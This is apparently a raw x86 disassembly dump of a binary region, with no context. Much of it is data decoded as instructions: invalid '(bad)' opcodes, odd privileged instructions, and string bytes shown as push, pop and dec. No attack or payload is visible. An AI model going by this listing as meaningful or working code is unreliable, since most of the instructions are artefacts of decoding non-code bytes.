  42a518:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a51f:	mov    edx,DWORD PTR [ebx]
  42a521:	in     al,0x45
  42a523:	or     DWORD PTR [ebx],esi
  42a525:	iret   
  42a526:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a52d:	xor    dl,BYTE PTR [eax-0x75]
  42a530:	sbb    al,ah
  42a532:	dec    DWORD PTR [ecx]
  42a534:	mov    ecx,edi
  42a536:	in     al,dx
  42a537:	mov    eax,es
  42a539:	dec    eax
  42a53a:	mov    DWORD PTR [edx],esi
  42a53c:	fmul   QWORD PTR [edx]
  42a53e:	jne    0x42a4cb
  42a540:	(bad)  
  42a541:	(bad)  
  42a543:	or     DWORD PTR [ebp-0x31],eax
  42a546:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a54d:	cmp    bh,bh
  42a54f:	jne    0x42a596
  42a551:	lea    ecx,[ebx-0x38372750]
  42a557:	inc    ebx
  42a559:	mov    eax,ecx
  42a55b:	mov    eax,0xa00c111
  42a560:	jne    0x42a5a7
  42a562:	mov    esi,DWORD PTR [ebx]
  42a564:	test   al,0x3
  42a566:	inc    ebp
  42a567:	mov    DWORD PTR [eax-0xc],edx
  42a56a:	fiadd  WORD PTR [ebp-0x1]
  42a56d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a573:	jb     0x42a576
  42a575:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a57b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a581:	retf   
  42a582:	mov    edx,ecx
  42a584:	adc    al,0x84
  42a586:	(bad)  
  42a587:	std    
  42a588:	ret    
  42a589:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a58f:	hlt    
  42a590:	rol    edi,0x82
  42a593:	ret    
  42a594:	cld    
  42a595:	enter  0x11ff,0x45
  42a599:	inc    ebp
  42a59a:	pop    edi
  42a59b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a59e:	ret    0xc7
  42a5a1:	test   BYTE PTR [ebx+0x45325198],cl
  42a5a7:	jmp    0x42a534
  42a5a9:	push   0x8
  42a5ab:	call   DWORD PTR [esi]
  42a5ad:	in     al,dx
  42a5ae:	add    BYTE PTR [ebp+0x1],0x50
  42a5b2:	add    bl,ah
  42a5b4:	add    bh,bh
  42a5b6:	icebp  
  42a5b7:	mov    ecx,DWORD PTR [eax]
  42a5b9:	cld    
  42a5ba:	pop    es
  42a5bb:	dec    ebp
  42a5bc:	shl    DWORD PTR [ebx],0x72
  42a5bf:	add    eax,DWORD PTR [eax]
  42a5c1:	cmp    edx,ecx
  42a5c3:	je     0x42a5d5
  42a5c5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5c8:	inc    edi
  42a5ca:	or     al,0xc3
  42a5cc:	jmp    FWORD PTR [edx-0x18]
  42a5cf:	(bad)  
  42a5d0:	sti    
  42a5d1:	cwde   
  42a5d2:	(bad)  
  42a5d3:	call   0xffa09ede
  42a5d8:	or     al,0x45
  42a5da:	push   ebp
  42a5db:	sub    esp,0x18
  42a5de:	push   ebx
  42a5df:	inc    ebp
  42a5e0:	mov    edi,edi
  42a5e2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5e9:	test   al,0x50
  42a5eb:	inc    ebp
  42a5ec:	push   ecx
  42a5ed:	push   eax
  42a5ee:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5f4:	add    ah,bh
  42a5f6:	(bad)  
  42a5f7:	dec    ebp
  42a5f8:	add    DWORD PTR [ebx],esi
  42a5fa:	inc    ebp
  42a5fb:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a601:	push   0xffffff8b
  42a603:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a609:	add    eax,DWORD PTR [ecx]
  42a60b:	or     BYTE PTR [eax],al
  42a60d:	call   0xff849e12
  42a612:	mov    eax,DWORD PTR [ebp+0x14]
  42a615:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a61b:	inc    ebp
  42a61c:	dec    ecx
  42a61d:	add    ebp,DWORD PTR [edx+0x14]
  42a620:	push   0x8b3045
  42a625:	call   0x33acf39a
  42a62a:	inc    DWORD PTR [ebx]
  42a62c:	mov    DWORD PTR [edi],ecx
  42a62e:	mov    eax,ecx
  42a630:	or     BYTE PTR [ebp-0x3d],cl
  42a633:	cmp    eax,edi
  42a635:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a63a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a640:	adc    al,0xc9
  42a642:	inc    ebp
  42a643:	adc    BYTE PTR [eax+0x55],dl
  42a646:	jne    0x42a634
  42a648:	call   0xff53a5d8
  42a64d:	dec    ebp
  42a64e:	inc    ebp
  42a64f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a655:	add    BYTE PTR [ebx],bh
  42a657:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a65b:	push   eax
  42a65c:	or     al,0x51
  42a65e:	dec    ebp
  42a65f:	xor    DWORD PTR [ebx],0xf320398
  42a665:	cmp    eax,DWORD PTR [ebp+0x74]
  42a668:	mov    edi,edi
  42a66a:	pop    edi
  42a66b:	adc    BYTE PTR [ebx+0x75],bl
  42a66e:	ret    0x50
  42a671:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a675:	(bad)  
  42a676:	clc    
  42a677:	mov    esp,ebp
  42a679:	pop    ecx
  42a67a:	mov    ecx,0xf80085c2
  42a67f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a682:	push   esi
  42a683:	push   esi
  42a684:	(bad)  
  42a685:	lock add DWORD PTR [ebp+0x44],eax
  42a689:	mov    edx,DWORD PTR [eax]
  42a68b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a68f:	or     BYTE PTR [eax+0x7],dl
  42a692:	push   ecx
  42a693:	ret    
  42a694:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a69a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a6a0:	or     al,0x80
  42a6a2:	jge    0x42a6a5
  42a6a4:	mov    DWORD PTR [eax],eax
  42a6a6:	and    al,0x8
  42a6a8:	cmp    DWORD PTR [ebp+0x10],eax
  42a6ab:	mov    edx,DWORD PTR [esi]
  42a6ad:	xchg   esp,eax
  42a6ae:	dec    esp
  42a6af:	add    BYTE PTR [eax],dl
  42a6b1:	mov    ecx,edx
  42a6b3:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a6b7:	dec    ebp
  42a6b8:	into   
  42a6b9:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a6bf:	mov    edx,DWORD PTR [eax+0x14]
  42a6c2:	das    
  42a6c3:	add    al,0x45
  42a6c5:	add    BYTE PTR [ebp+0x0],dh
  42a6c8:	mov    edi,edi
  42a6ca:	and    al,0x50
  42a6cc:	mov    eax,DWORD PTR [eax]
  42a6ce:	and    al,0xd1
  42a6d0:	xor    eax,DWORD PTR [esi]
  42a6d2:	lea    eax,[ebp+0x8]
  42a6d5:	xor    esi,DWORD PTR [edx+0x3]
  42a6d8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6de:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6e4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ee:	cmp    edi,edi
  42a6f0:	pushf  
  42a6f1:	mov    edi,edi
  42a6f3:	or     BYTE PTR [esi+ecx*1],cl
  42a6f6:	jne    0x42a6bb
  42a6f8:	call   0xba6c4
  42a6fd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a701:	mov    ebx,DWORD PTR [eax]
  42a703:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a707:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a70f:	pop    esi
  42a710:	dec    ecx
  42a712:	and    al,0x10
  42a714:	call   DWORD PTR [ebp+0x24]
  42a717:	in     al,dx
  42a718:	call   0xffc6a601
  42a71d:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a721:	pushf  
  42a722:	pop    esi
  42a723:	mov    ebp,esp
  42a725:	and    al,0xc2
  42a727:	push   edi
  42a728:	add    BYTE PTR [ecx+0x3a],al
  42a72b:	mov    DWORD PTR [ebp+0x24],esi
  42a72e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a734:	dec    DWORD PTR [eax]
  42a736:	and    al,0x7
  42a738:	(bad)  
  42a739:	cli    
  42a73a:	and    al,0x98
  42a73c:	or     BYTE PTR [edx],dh
  42a73e:	sbb    BYTE PTR [ebx],al
  42a740:	adc    al,0x89
  42a742:	jmp    DWORD PTR [esp]
  42a745:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a74b:	adc    al,0x8
  42a74d:	dec    ebp
  42a74e:	adc    BYTE PTR [ebp-0x7c],dh
  42a751:	mov    esi,DWORD PTR [edx]
  42a753:	and    al,0x24
  42a755:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a75b:	add    edi,eax
  42a75d:	pcmpeqb mm1,mm2
  42a760:	jmp    0x42a7ae
  42a762:	dec    DWORD PTR [eax]
  42a764:	je     0x42a751
  42a766:	mov    edi,DWORD PTR [ecx]
  42a768:	pop    ebp
  42a769:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a76d:	cwde   
  42a76e:	mov    DWORD PTR [eax-0x8],ebp
  42a771:	jge    0x42a7db
  42a773:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a779:	jl     0x42a7c5
  42a77b:	adc    BYTE PTR [eax],al
  42a77d:	pop    esp
  42a77e:	cmp    al,0x10
  42a780:	add    BYTE PTR [ecx+0x41],dl
  42a783:	adc    BYTE PTR [eax],al
  42a785:	test   al,0x21
  42a787:	adc    BYTE PTR [eax],al
  42a789:	cs jbe 0x42a79c
  42a78c:	add    BYTE PTR [edx+0xe],ch
  42a78f:	adc    BYTE PTR [eax],al
  42a791:	clc    
  42a792:	pusha  
  42a793:	adc    BYTE PTR [eax],al
  42a795:	jp     0x42a7d8
  42a797:	adc    BYTE PTR [eax],al
  42a799:	mov    ds:0x88001059,eax
  42a79e:	pop    ebp
  42a79f:	adc    BYTE PTR [eax],al
  42a7a1:	inc    ax
  42a7a3:	adc    BYTE PTR [eax],al
  42a7a5:	jns    0x42a74e
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x7affbd59],al
  42a7b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7b3:	inc    edx
  42a7b4:	add    BYTE PTR [ecx-0x72ffbd59],cl
  42a7ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7bb:	inc    edx
  42a7bc:	add    BYTE PTR [ecx-0x6affbd59],dl
  42a7c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7c3:	inc    edx
  42a7c4:	add    BYTE PTR [ecx-0x62ffbd59],bl
  42a7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7cb:	inc    edx
  42a7cc:	add    BYTE PTR [ecx-0x2effbd59],ah
  42a7d2:	cmp    BYTE PTR [eax],dl
  42a7d4:	add    BYTE PTR [edi],dl
  42a7d6:	xor    BYTE PTR [eax],dl
  42a7d8:	add    BYTE PTR [eax],al
  42a7da:	pop    ds
  42a7db:	adc    BYTE PTR [eax],al
  42a7dd:	(bad)  
  42a7de:	adc    BYTE PTR ds:[eax],al
  42a7e1:	in     eax,0x19
  42a7e3:	adc    BYTE PTR [eax],al
  42a7e5:	bound  ebx,QWORD PTR [ecx]
  42a7e7:	adc    BYTE PTR [eax],al
  42a7e9:	shl    BYTE PTR [edi+0x10],1
  42a7ec:	add    BYTE PTR [edi-0x2effefa9],al
  42a7f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7f3:	inc    edx
  42a7f4:	add    ch,dl
  42a7f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7f7:	inc    edx
  42a7f8:	add    cl,bl
  42a7fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7fb:	inc    edx
  42a7fc:	add    ch,bl
  42a7fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ff:	inc    edx
  42a800:	add    cl,ah
  42a802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a803:	inc    edx
  42a804:	add    ch,ah
  42a806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a807:	inc    edx
  42a808:	add    cl,ch
  42a80a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a80b:	inc    edx
  42a80c:	add    ch,ch
  42a80e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a80f:	inc    edx
  42a810:	add    dl,ah
  42a812:	adc    BYTE PTR ds:[eax],al
  42a815:	ds pop ebp
  42a817:	adc    BYTE PTR [eax],al
  42a819:	add    BYTE PTR [esi+0x10],ah
  42a81c:	add    al,ch
  42a81e:	pop    eax
  42a81f:	adc    BYTE PTR [eax],al
  42a821:	cdq    
  42a822:	outs   dx,BYTE PTR ds:[esi]
  42a823:	adc    BYTE PTR [eax],al
  42a825:	ja     0x42a887
  42a827:	adc    BYTE PTR [eax],al
  42a829:	jne    0x42a862
  42a82b:	adc    BYTE PTR [eax],al
  42a82d:	arpl   WORD PTR [eax+edx*1],bx
  42a830:	add    BYTE PTR [ecx],dl
  42a832:	test   al,0x42
  42a834:	add    BYTE PTR ds:0x190042a8,dl
  42a83a:	test   al,0x42
  42a83c:	add    BYTE PTR ds:0x210042a8,bl
  42a842:	test   al,0x42
  42a844:	add    BYTE PTR ds:0x290042a8,ah
  42a84a:	test   al,0x42
  42a84c:	add    BYTE PTR ds:0x5c0042a8,ch
  42a852:	adc    DWORD PTR [eax],edx
  42a854:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a85b:	adc    BYTE PTR [eax],al
  42a85d:	and    al,0x30
  42a85f:	adc    BYTE PTR [eax],al
  42a861:	ret    
  42a862:	pop    edi
  42a863:	adc    BYTE PTR [eax],al
  42a865:	loopne 0x42a8cd
  42a867:	adc    BYTE PTR [eax],al
  42a869:	add    eax,0xd400105b
  42a86e:	aas    
  42a86f:	adc    BYTE PTR [eax],al
  42a871:	push   ecx
  42a872:	test   al,0x42
  42a874:	add    BYTE PTR [ebp-0x58],dl
  42a877:	inc    edx
  42a878:	add    BYTE PTR [ecx-0x58],bl
  42a87b:	inc    edx
  42a87c:	add    BYTE PTR [ebp-0x58],bl
  42a87f:	inc    edx
  42a880:	add    BYTE PTR [ecx-0x58],ah
  42a883:	inc    edx
  42a884:	add    BYTE PTR [ebp-0x58],ah
  42a887:	inc    edx
  42a888:	add    BYTE PTR [ecx-0x58],ch
  42a88b:	inc    edx
  42a88c:	add    BYTE PTR [ebp-0x58],ch
  42a88f:	inc    edx
  42a890:	add    dh,dl
  42a892:	sbb    eax,0x10f00010
  42a897:	adc    BYTE PTR [eax],al
  42a899:	inc    ecx
  42a89a:	bound  edx,QWORD PTR [eax]
  42a89c:	add    BYTE PTR [ebx+eax*1],ah
  42a89f:	adc    BYTE PTR [eax],al
  42a8a1:	jecxz  0x42a906
  42a8a3:	adc    BYTE PTR [eax],al
  42a8a5:	pushf  
  42a8a6:	xor    DWORD PTR [eax],edx
  42a8a8:	add    BYTE PTR [ecx],al
  42a8aa:	or     dl,BYTE PTR [eax]
  42a8ac:	add    dh,dl
  42a8ae:	inc    edi
  42a8af:	adc    BYTE PTR [eax],al
  42a8b1:	xchg   ecx,eax
  42a8b2:	test   al,0x42
  42a8b4:	add    BYTE PTR [ebp-0x66ffbd58],dl
  42a8ba:	test   al,0x42
  42a8bc:	add    BYTE PTR [ebp-0x5effbd58],bl
  42a8c2:	test   al,0x42
  42a8c4:	add    BYTE PTR [ebp-0x56ffbd58],ah
  42a8ca:	test   al,0x42
  42a8cc:	add    BYTE PTR [ebp+0x430042a8],ch
  42a8d2:	xor    dh,BYTE PTR [edx]
  42a8d4:	xor    eax,0x5a52345f
  42a8d9:	push   esp
  42a8da:	xor    BYTE PTR [esi],dh
  42a8dc:	add    BYTE PTR [ecx+0x36],cl
  42a8df:	push   eax
  42a8e0:	pop    edi
  42a8e1:	ss inc ebx
  42a8e3:	ss pop edx
  42a8e5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8e8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8ec:	pop    edi
  42a8ed:	dec    esi
  42a8ee:	dec    esp
  42a8ef:	dec    eax
  42a8f0:	xor    esi,DWORD PTR [edx]
  42a8f2:	pop    edi
  42a8f3:	xor    al,0x4b
  42a8f5:	add    BYTE PTR [eax+0x49],cl
  42a8f8:	push   ebp
  42a8f9:	xor    al,0x5f
  42a8fb:	dec    esp
  42a8fc:	inc    edx
  42a8fd:	dec    ecx
  42a8fe:	cmp    DWORD PTR [edi+ebx*2],esi
  42a901:	pop    ecx
  42a902:	inc    edi
  42a903:	add    BYTE PTR [eax+0x50],bl
  42a906:	dec    eax
  42a907:	pop    edi
  42a908:	push   ebp
  42a909:	push   ecx
  42a90a:	inc    edi
  42a90b:	xor    cl,BYTE PTR [edx+0x38]
  42a90e:	push   esi
  42a90f:	add    BYTE PTR [ebx+0x4a],al
  42a912:	push   edx
  42a913:	pop    edi
  42a914:	dec    edi
  42a915:	dec    eax
  42a916:	dec    edi
  42a917:	dec    edi
  42a918:	dec    edx
  42a919:	add    BYTE PTR [ecx+0x52],al
  42a91c:	cmp    DWORD PTR [edi+0x56],ebx
  42a91f:	aaa    
  42a920:	dec    esp
  42a921:	cmp    DWORD PTR [ebx+0x5f],eax
  42a924:	push   edx
  42a925:	inc    esp
  42a926:	add    BYTE PTR [ecx+0x37],bl
  42a929:	inc    esp
  42a92a:	pop    edi
  42a92b:	dec    ecx
  42a92c:	xor    esi,DWORD PTR [edi]
  42a92e:	xor    DWORD PTR [edi+0x49],ebx
  42a931:	push   esp
  42a932:	xor    eax,DWORD PTR [eax]
  42a934:	push   edx
  42a935:	xor    BYTE PTR [eax+0x5f],bl
  42a938:	dec    eax
  42a939:	push   edi
  42a93a:	inc    esi
  42a93b:	xor    DWORD PTR [edi+0x5f],edx
  42a93e:	cmp    BYTE PTR [ebx+0x37],dl
  42a941:	add    BYTE PTR [esi+0x42],dl
  42a944:	dec    ecx
  42a945:	xor    ebx,DWORD PTR [edi+0x45]
  42a948:	xor    BYTE PTR [ebp+0x5f],cl
  42a94b:	xor    al,0x34
  42a94d:	xor    BYTE PTR [edx+0x5f],cl
  42a950:	inc    edi
  42a951:	add    BYTE PTR [edx+0x57],dl
  42a954:	xor    ebx,DWORD PTR [edi+0x31]
  42a957:	dec    edx
  42a958:	push   edi
  42a959:	xor    eax,0x4d435f
  42a95e:	dec    ecx
  42a95f:	xor    eax,0x36365f39
  42a964:	dec    eax
  42a965:	xor    BYTE PTR [eax],al
  42a967:	dec    edi
  42a968:	inc    ebx
  42a969:	push   edi
  42a96a:	pop    edi
  42a96b:	inc    edi
  42a96c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a971:	add    BYTE PTR [edx+0x58],al
  42a974:	inc    edi
  42a975:	ss pop edi
  42a977:	push   esi
  42a978:	inc    ebx
  42a979:	dec    esi
  42a97a:	inc    esp
  42a97b:	add    BYTE PTR [edi+0x4d],cl
  42a97e:	inc    edi
  42a97f:	xor    ebx,DWORD PTR [edi+0x34]
  42a982:	dec    esi
  42a983:	pop    edx
  42a984:	cmp    BYTE PTR [edi+0x58],bl
  42a987:	cmp    BYTE PTR [eax],al
  42a989:	push   edx
  42a98a:	pop    eax
  42a98b:	push   ecx
  42a98c:	pop    edi
  42a98d:	dec    esp
  42a98e:	push   edx
  42a98f:	dec    ecx
  42a990:	dec    edi
  42a991:	inc    esp
  42a992:	pop    edi
  42a993:	dec    edi
  42a994:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a998:	push   eax
  42a999:	inc    ebp
  42a99a:	pop    edi
  42a99b:	xor    eax,0x565f3945
  42a9a0:	add    BYTE PTR [edi+0x4e],al
  42a9a3:	push   esi
  42a9a4:	pop    edi
  42a9a5:	inc    edi
  42a9a6:	push   esp
  42a9a7:	dec    eax
  42a9a8:	xor    dh,BYTE PTR [ecx]
  42a9aa:	pop    edi
  42a9ab:	dec    edi
  42a9ac:	xor    eax,DWORD PTR ss:[eax]
  42a9af:	inc    esp
  42a9b0:	inc    ebp
  42a9b1:	dec    ecx
  42a9b2:	pop    edi
  42a9b3:	push   edx
  42a9b4:	dec    eax
  42a9b5:	xor    al,0x48
  42a9b7:	dec    ecx
  42a9b8:	ss pop edi
  42a9ba:	aaa    
  42a9bb:	aaa    
  42a9bc:	dec    ecx
  42a9bd:	dec    ebp
  42a9be:	add    BYTE PTR [eax+0x54],cl
  42a9c1:	ss pop edi
  42a9c3:	inc    esi
  42a9c4:	inc    edx
  42a9c5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9c8:	dec    esi
  42a9c9:	ss dec edx
  42a9cb:	pop    edi
  42a9cc:	dec    ecx
  42a9cd:	dec    esp
  42a9ce:	inc    edi
  42a9cf:	inc    esp
  42a9d0:	dec    eax
  42a9d1:	xor    BYTE PTR [eax],bh
  42a9d3:	xor    eax,0x4c344f00
  42a9d8:	xor    esi,DWORD PTR [edi]
  42a9da:	xor    BYTE PTR [edi+0x44],bl
  42a9dd:	inc    edi
  42a9de:	dec    ebx
  42a9df:	xor    al,BYTE PTR [ecx+0x43]
  42a9e2:	add    BYTE PTR [edi+0x32],cl
  42a9e5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9e8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9eb:	pop    edx
  42a9ec:	add    BYTE PTR [eax+0x4c],bl
  42a9ef:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9f2:	inc    ecx
  42a9f3:	dec    edx
  42a9f4:	inc    esi
  42a9f5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9f8:	pop    eax
  42a9f9:	inc    edi
  42a9fa:	inc    edx
  42a9fb:	add    BYTE PTR [eax+0x33],dl
  42a9fe:	dec    esi
  42a9ff:	pop    edi
  42aa00:	dec    eax
  42aa01:	xor    eax,0x485f53
  42aa06:	dec    ebp
  42aa07:	xor    BYTE PTR [edx+0x5f],al
  42aa0a:	dec    edx
  42aa0b:	pop    eax
  42aa0c:	push   esp
  42aa0d:	dec    ecx
  42aa0e:	dec    esp
  42aa0f:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42aa13:	xor    esi,DWORD PTR [eax]
  42aa15:	pop    edi
  42aa16:	inc    ecx
  42aa17:	pop    edx
  42aa18:	push   ecx
  42aa19:	pop    edx
  42aa1a:	cmp    DWORD PTR [esi],esi
  42aa1c:	pop    edi
  42aa1d:	dec    eax
  42aa1e:	dec    esp
  42aa1f:	pop    edx
  42aa20:	add    BYTE PTR [ecx+0x57],dl
  42aa23:	pop    ecx
  42aa24:	pop    edi
  42aa25:	push   esi
  42aa26:	xor    al,0x44
  42aa28:	xor    DWORD PTR [eax],edi
  42aa2a:	xor    bl,BYTE PTR [edi+0x39]
  42aa2d:	push   esp
  42aa2e:	push   esp
  42aa2f:	add    BYTE PTR [esi+0x0],dl
  42aa32:	dec    edi
  42aa33:	add    BYTE PTR [edi+0x0],al
  42aa36:	add    BYTE PTR ss:[edi+0x0],bl
  42aa3a:	dec    edi
  42aa3b:	add    BYTE PTR [edx+0x0],bl
  42aa3e:	inc    ebp
  42aa3f:	add    BYTE PTR [eax],dh
  42aa41:	add    BYTE PTR [ebp+0x0],al
  42aa44:	xor    BYTE PTR [eax],al
  42aa46:	pop    edi
  42aa47:	add    BYTE PTR [eax],dh
  42aa49:	add    BYTE PTR ds:0x4f000000,dh
  42aa4f:	add    BYTE PTR ds:0x5f005700,dh
  42aa55:	add    BYTE PTR [edi],dh
  42aa57:	add    BYTE PTR [ebx+0x0],dl
  42aa5a:	push   ebp
  42aa5b:	add    BYTE PTR [edi+0x0],al
  42aa5e:	xor    al,0x0
  42aa60:	pop    edi
  42aa61:	add    BYTE PTR [ecx+0x0],dl
  42aa64:	inc    esp
  42aa65:	add    BYTE PTR [eax],al
  42aa67:	add    BYTE PTR [edx+0x0],dl
  42aa6a:	push   esp
  42aa6b:	add    BYTE PTR ds:0x52005f00,dh
  42aa71:	add    BYTE PTR [edi+0x0],dl
  42aa74:	xor    al,BYTE PTR [eax]
  42aa76:	xor    al,BYTE PTR [eax]
  42aa78:	xor    BYTE PTR [eax],al
  42aa7a:	xor    BYTE PTR [eax],al
  42aa7c:	pop    edi
  42aa7d:	add    BYTE PTR [esi],dh
  42aa7f:	add    BYTE PTR [eax],al
  42aa81:	add    BYTE PTR [eax+0x0],cl
  42aa84:	inc    ebp
  42aa85:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa89:	add    BYTE PTR [edi+0x0],bl
  42aa8c:	dec    edx
  42aa8d:	add    BYTE PTR [edx],dh
  42aa8f:	add    BYTE PTR [edi],dh
  42aa91:	add    BYTE PTR [ebp+0x0],dl
  42aa94:	add    BYTE PTR ss:[eax],dh
  42aa97:	add    BYTE PTR [eax],al
  42aa99:	add    BYTE PTR [esi+0x0],dl
  42aa9c:	cmp    BYTE PTR [eax],al
  42aa9e:	dec    edi
  42aa9f:	add    BYTE PTR [ecx],bh
  42aaa1:	add    BYTE PTR [edi+0x0],bl
  42aaa4:	pop    eax
  42aaa5:	add    BYTE PTR [edx+0x0],bl
  42aaa8:	dec    esp
  42aaa9:	add    BYTE PTR [ebx+0x0],cl
  42aaac:	add    BYTE PTR [eax],al
  42aaae:	dec    ecx
  42aaaf:	add    BYTE PTR [ebp+0x0],dl
  42aab2:	dec    edi
  42aab3:	add    BYTE PTR [eax],bh
  42aab5:	add    BYTE PTR [edi+0x0],bl
  42aab8:	inc    esp
  42aab9:	add    BYTE PTR [eax],bh
  42aabb:	add    BYTE PTR [ecx+0x0],cl
  42aabe:	dec    eax
  42aabf:	add    BYTE PTR [edi+0x0],cl
  42aac2:	pop    edi
  42aac3:	add    BYTE PTR [ebp+0x0],al
  42aac6:	pop    eax
  42aac7:	add    BYTE PTR [eax],al
  42aac9:	add    BYTE PTR [edx+0x0],dl
  42aacc:	dec    esp
  42aacd:	add    BYTE PTR [esi],dh
  42aacf:	add    BYTE PTR [edi+0x0],bl
  42aad2:	aaa    
  42aad3:	add    BYTE PTR [eax+0x0],bl
  42aad6:	xor    eax,DWORD PTR [eax]
  42aad8:	inc    edi
  42aad9:	add    BYTE PTR [ecx+0x0],dl
  42aadc:	pop    edi
  42aadd:	add    BYTE PTR [edx+0x0],cl
  42aae0:	add    BYTE PTR [eax],al
  42aae2:	inc    edi
  42aae3:	add    BYTE PTR [edi+0x0],cl
  42aae6:	push   ebx
  42aae7:	add    BYTE PTR [eax+eax*1],dh
  42aaea:	pop    edi
  42aaeb:	add    BYTE PTR [ecx+0x0],cl
  42aaee:	xor    DWORD PTR [eax],eax
  42aaf0:	push   esi
  42aaf1:	add    BYTE PTR [ebx],dh
  42aaf3:	add    BYTE PTR [edi+0x0],bl
  42aaf6:	dec    ecx
  42aaf7:	add    BYTE PTR [edx+0x0],bl
  42aafa:	add    BYTE PTR [eax],al
  42aafc:	inc    ebx
  42aafd:	add    BYTE PTR [ecx+0x0],bl
  42ab00:	inc    ecx
  42ab01:	add    BYTE PTR [eax],dh
  42ab03:	add    BYTE PTR [ecx],bh
  42ab05:	add    BYTE PTR [edi+0x0],bl
  42ab08:	cmp    DWORD PTR [eax],eax
  42ab0a:	push   eax
  42ab0b:	add    BYTE PTR [eax+eax*1],dh
  42ab0e:	pop    edx
  42ab0f:	add    BYTE PTR [eax],al
  42ab11:	add    BYTE PTR [edx+0x0],al
  42ab14:	inc    esi
  42ab15:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42ab19:	add    BYTE PTR [ebp+0x0],dl
  42ab1c:	push   ebp
  42ab1d:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab21:	add    BYTE PTR [eax],al
  42ab23:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab27:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab2b:	add    BYTE PTR [edi+0x0],bl
  42ab2e:	xor    eax,DWORD PTR [eax]
  42ab30:	cmp    DWORD PTR [eax],eax
  42ab32:	dec    eax
  42ab33:	add    BYTE PTR [edi+0x0],bl
  42ab36:	dec    ebp
  42ab37:	add    BYTE PTR [ecx+0x0],bl
  42ab3a:	cmp    DWORD PTR [eax],eax
  42ab3c:	inc    ecx
  42ab3d:	add    BYTE PTR [esi+0x0],cl
  42ab40:	add    BYTE PTR [eax],al
  42ab42:	inc    ebx
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	dec    esi
  42ab47:	add    BYTE PTR [eax+eax*1],dh
  42ab4a:	pop    edi
  42ab4b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab4f:	add    BYTE PTR [ebx+0x0],cl
  42ab52:	xor    DWORD PTR [eax],eax
  42ab54:	add    BYTE PTR [eax],al
  42ab56:	inc    ecx
  42ab57:	add    BYTE PTR [edi],dh
  42ab59:	add    BYTE PTR [edx+0x0],cl
  42ab5c:	pop    edi
  42ab5d:	add    BYTE PTR [ebx+0x0],al
  42ab60:	cmp    BYTE PTR [eax],al
  42ab62:	push   edi
  42ab63:	add    BYTE PTR [eax+0x0],dl
  42ab66:	pop    edi
  42ab67:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab6b:	add    BYTE PTR [edx],dh
  42ab6d:	add    BYTE PTR [eax],al
